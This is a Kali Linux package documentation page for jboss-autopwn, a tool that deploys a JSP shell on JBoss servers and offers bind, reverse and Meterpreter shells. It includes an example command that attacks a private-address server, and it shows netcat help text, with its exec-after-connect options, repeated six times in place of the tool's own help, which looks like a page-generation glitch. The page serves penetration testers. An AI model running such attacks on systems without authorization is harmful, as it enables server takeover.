---
Title: jboss-autopwn
Homepage: https://github.com/SpiderLabs/jboss-autopwn
Repository: https://gitlab.com/kalilinux/packages/jboss-autopwn
Architectures: all
Version: 0.1-1kali2
Metapackages: kali-linux-everything kali-linux-large kali-tools-web 
Icon: images/jboss-autopwn-logo.svg
PackagesInfo: |
 ### jboss-autopwn
 
  This JBoss script deploys a JSP shell on the target JBoss
  AS server. Once deployed, the script uses its upload and
  command execution capability to provide an interactive
  session.
   
  Features include:
     - Multiplatform support - tested on Windows, Linux and Mac targets
     - Support for bind and reverse bind shells
     - Meterpreter shells and VNC support for Windows targets
 
 **Installed size:** `114 KB`  
 **How to install:** `sudo apt install jboss-autopwn`  
 
 {{< spoiler "Dependencies:" >}}
 * curl
 * metasploit-framework
 {{< /spoiler >}}
 
 ##### jboss-linux
 
 
 ```
 root@kali:~# jboss-linux -h
 [v1.10-47]
 connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
 listen for inbound:	nc -l -p port [-options] [hostname] [port]
 options:
 	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
 	-e filename		program to exec after connect [dangerous!!]
 	-b			allow broadcasts
 	-g gateway		source-routing hop point[s], up to 8
 	-G num			source-routing pointer: 4, 8, 12, ...
 	-h			this cruft
 	-i secs			delay interval for lines sent, ports scanned
         -k                      set keepalive option on socket
 	-l			listen mode, for inbound connects
 	-n			numeric-only IP addresses, no DNS
 	-o file			hex dump of traffic
 	-p port			local port number
 	-r			randomize local and remote ports
 	-q secs			quit after EOF on stdin and delay of secs
 	-s addr			local source address
 	-T tos			set Type Of Service
 	-t			answer TELNET negotiation
 	-u			UDP mode
 	-v			verbose [use twice to be more verbose]
 	-w secs			timeout for connects and final net reads
 	-C			Send CRLF as line-ending
 	-z			zero-I/O mode [used for scanning]
 port numbers can be individual or ranges: lo-hi [inclusive];
 hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
 [v1.10-47]
 connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
 listen for inbound:	nc -l -p port [-options] [hostname] [port]
 options:
 	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
 	-e filename		program to exec after connect [dangerous!!]
 	-b			allow broadcasts
 	-g gateway		source-routing hop point[s], up to 8
 	-G num			source-routing pointer: 4, 8, 12, ...
 	-h			this cruft
 	-i secs			delay interval for lines sent, ports scanned
         -k                      set keepalive option on socket
 	-l			listen mode, for inbound connects
 	-n			numeric-only IP addresses, no DNS
 	-o file			hex dump of traffic
 	-p port			local port number
 	-r			randomize local and remote ports
 	-q secs			quit after EOF on stdin and delay of secs
 	-s addr			local source address
 	-T tos			set Type Of Service
 	-t			answer TELNET negotiation
 	-u			UDP mode
 	-v			verbose [use twice to be more verbose]
 	-w secs			timeout for connects and final net reads
 	-C			Send CRLF as line-ending
 	-z			zero-I/O mode [used for scanning]
 port numbers can be individual or ranges: lo-hi [inclusive];
 hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
 [v1.10-47]
 connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
 listen for inbound:	nc -l -p port [-options] [hostname] [port]
 options:
 	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
 	-e filename		program to exec after connect [dangerous!!]
 	-b			allow broadcasts
 	-g gateway		source-routing hop point[s], up to 8
 	-G num			source-routing pointer: 4, 8, 12, ...
 	-h			this cruft
 	-i secs			delay interval for lines sent, ports scanned
         -k                      set keepalive option on socket
 	-l			listen mode, for inbound connects
 	-n			numeric-only IP addresses, no DNS
 	-o file			hex dump of traffic
 	-p port			local port number
 	-r			randomize local and remote ports
 	-q secs			quit after EOF on stdin and delay of secs
 	-s addr			local source address
 	-T tos			set Type Of Service
 	-t			answer TELNET negotiation
 	-u			UDP mode
 	-v			verbose [use twice to be more verbose]
 	-w secs			timeout for connects and final net reads
 	-C			Send CRLF as line-ending
 	-z			zero-I/O mode [used for scanning]
 port numbers can be individual or ranges: lo-hi [inclusive];
 hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
 ```
 
 - - -
 
 ##### jboss-win
 
 
 ```
 root@kali:~# jboss-win -h
 [v1.10-47]
 connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
 listen for inbound:	nc -l -p port [-options] [hostname] [port]
 options:
 	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
 	-e filename		program to exec after connect [dangerous!!]
 	-b			allow broadcasts
 	-g gateway		source-routing hop point[s], up to 8
 	-G num			source-routing pointer: 4, 8, 12, ...
 	-h			this cruft
 	-i secs			delay interval for lines sent, ports scanned
         -k                      set keepalive option on socket
 	-l			listen mode, for inbound connects
 	-n			numeric-only IP addresses, no DNS
 	-o file			hex dump of traffic
 	-p port			local port number
 	-r			randomize local and remote ports
 	-q secs			quit after EOF on stdin and delay of secs
 	-s addr			local source address
 	-T tos			set Type Of Service
 	-t			answer TELNET negotiation
 	-u			UDP mode
 	-v			verbose [use twice to be more verbose]
 	-w secs			timeout for connects and final net reads
 	-C			Send CRLF as line-ending
 	-z			zero-I/O mode [used for scanning]
 port numbers can be individual or ranges: lo-hi [inclusive];
 hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
 [v1.10-47]
 connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
 listen for inbound:	nc -l -p port [-options] [hostname] [port]
 options:
 	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
 	-e filename		program to exec after connect [dangerous!!]
 	-b			allow broadcasts
 	-g gateway		source-routing hop point[s], up to 8
 	-G num			source-routing pointer: 4, 8, 12, ...
 	-h			this cruft
 	-i secs			delay interval for lines sent, ports scanned
         -k                      set keepalive option on socket
 	-l			listen mode, for inbound connects
 	-n			numeric-only IP addresses, no DNS
 	-o file			hex dump of traffic
 	-p port			local port number
 	-r			randomize local and remote ports
 	-q secs			quit after EOF on stdin and delay of secs
 	-s addr			local source address
 	-T tos			set Type Of Service
 	-t			answer TELNET negotiation
 	-u			UDP mode
 	-v			verbose [use twice to be more verbose]
 	-w secs			timeout for connects and final net reads
 	-C			Send CRLF as line-ending
 	-z			zero-I/O mode [used for scanning]
 port numbers can be individual or ranges: lo-hi [inclusive];
 hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
 [v1.10-47]
 connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
 listen for inbound:	nc -l -p port [-options] [hostname] [port]
 options:
 	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
 	-e filename		program to exec after connect [dangerous!!]
 	-b			allow broadcasts
 	-g gateway		source-routing hop point[s], up to 8
 	-G num			source-routing pointer: 4, 8, 12, ...
 	-h			this cruft
 	-i secs			delay interval for lines sent, ports scanned
         -k                      set keepalive option on socket
 	-l			listen mode, for inbound connects
 	-n			numeric-only IP addresses, no DNS
 	-o file			hex dump of traffic
 	-p port			local port number
 	-r			randomize local and remote ports
 	-q secs			quit after EOF on stdin and delay of secs
 	-s addr			local source address
 	-T tos			set Type Of Service
 	-t			answer TELNET negotiation
 	-u			UDP mode
 	-v			verbose [use twice to be more verbose]
 	-w secs			timeout for connects and final net reads
 	-C			Send CRLF as line-ending
 	-z			zero-I/O mode [used for scanning]
 port numbers can be individual or ranges: lo-hi [inclusive];
 hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
 ```
 
 - - -
 
---
{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## jboss-autopwn Usage Example

Attack the target server (`192.168.1.200`) on the specified port (`8080`), redirecting stderr (`2> /dev/null`):

```
root@kali:~# jboss-linux 192.168.1.200 8080 2> /dev/null
[x] Retrieving cookie
[x] Now creating BSH script...
[!] Cound not create BSH script..
[x] Now deploying .war file:
```
